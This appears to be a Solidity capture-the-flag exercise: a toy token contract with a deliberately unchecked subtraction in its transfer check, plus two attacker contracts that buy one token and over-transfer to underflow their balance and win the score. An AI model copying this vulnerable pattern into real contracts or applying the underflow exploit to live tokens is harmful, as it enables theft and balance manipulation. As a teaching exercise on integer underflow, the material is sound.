// 得到尽可能多的token
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
contract att{
    Cal cal;
    constructor(address addr) public {
        cal = Cal(addr);
    }
    function a() public payable  {
        cal.buy{value : 0.01 ether}();
        cal.transfer(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, 0.011 ether);
        cal.isComplete();
    }
}
contract attract{
    Cal cal;
    constructor(address addr) public {
        cal = Cal(addr);
    }
    function att()public payable  {
        cal.buy.value(0.01 ether)();
        cal.transfer(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, 0.011 ether);
        cal.isComplete();
    }
    function test()pure public  returns(uint c){
        uint a = 1;
        uint b = 2;
        c = a - b;
    }
}
contract Cal{
    uint public score;
    string private name;
    string private symbol;
    mapping(address=>uint)public balance;

    function mint(address to,uint amount) private{
        balance[to]+=amount;
    }
    function buy() public payable{
        require(msg.value>=0.01 ether,"zero value");
        mint(msg.sender,msg.value/1e16);
    }

    function transfer(address to,uint amount)public{
        require(to!=address(0),"invalid address");
        require(amount>0,"invalid amount");
        require(balance[msg.sender]-amount>=0);
        balance[msg.sender]-=amount;
        balance[to]+=amount;
        require(balance[to]>balance[to]-amount);
    }

    function isComplete()public returns(uint){
        score=0;
        if(balance[msg.sender]!=0){score=20;}
        if(balance[msg.sender]>10000000000000000){score=100;}
        return score;
    }
}